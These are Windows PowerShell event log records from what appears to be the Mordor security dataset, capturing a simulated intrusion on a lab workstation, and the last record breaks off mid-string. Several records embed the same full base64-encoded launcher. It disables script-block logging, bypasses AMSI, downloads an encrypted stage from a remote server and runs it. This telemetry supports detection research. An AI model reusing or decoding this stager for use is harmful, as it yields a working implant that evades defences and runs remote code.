{"Task":8,"EventReceivedTime":"2020-07-22 00:18:59","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:                                 $a9486 = New-Object System.Net.WebClient\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11284\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                $a9486 = New-Object System.Net.WebClient\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:18:59.079Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8988}
{"Task":106,"EventReceivedTime":"2020-07-22 00:18:59","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0000-E1BB-DC81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11285\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBA